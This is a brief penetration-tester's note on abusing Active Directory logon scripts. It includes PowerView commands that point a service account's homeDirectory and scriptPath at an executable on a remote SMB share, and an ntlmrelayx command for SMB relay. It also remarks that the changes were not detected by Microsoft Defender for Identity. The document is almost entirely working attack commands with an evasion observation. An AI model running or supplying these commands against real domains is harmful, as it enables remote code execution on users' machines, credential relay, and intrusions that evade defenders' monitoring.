# Logon script abuse
- modifying homeDirectory or scriptPath wasn't detecetd by MDI
```
# logon script abuse
Set-DomainObject -Identity svc_mhd2 -Set @{'homeDirectory' = '\\172.23.126.150\scripts\share'}
Set-DomainObject -Identity svc_mhd2 -Set @{'scriptPath' = '\\172.23.126.150\scripts\logon.exe'}

# smb relay
sudo ntlmrelayx.py -t smb://172.23.126.139 -smb2support -socks
```

![](img/Pasted%20image%2020260423155716.png)

![](img/Pasted%20image%2020260424145358.png)

![](img/Pasted%20image%2020260424145407.png)



